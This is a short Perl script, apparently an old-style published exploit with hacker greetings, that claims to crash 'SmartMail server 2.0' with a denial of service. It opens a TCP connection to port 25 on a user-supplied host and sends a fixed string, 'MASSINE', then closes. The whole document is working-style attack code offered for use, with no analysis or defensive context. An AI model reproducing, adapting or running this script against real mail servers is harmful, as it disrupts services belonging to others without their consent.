#!/usr/bin/perl -w
# greetz: marocit and #crack.fr (christal)
# securma@caramail.com
use Socket;
if (not $ARGV[0]) {
        print qq~
                Usage: sm.pl <host>
        ~;
exit;}

$ip=$ARGV[0];
print "SmartMail server 2.0 DoS\n\n";
print "Sending Exploit Code to host: " . $ip . "\n\n";
sendexplt("MASSINE");
sub sendexplt {
 my ($pstr)=@_;
        $target= inet_aton($ip) || die("inet_aton
problems");
 socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')
||0) ||
 die("Socket problems\n");
 if(connect(S,pack "SnA4x8",2,25,$target)){
 select(S);
                $|=1;
 print $pstr;
 sleep 3;
         close(S);
 } else { die("Can't connect...\n"); }
}

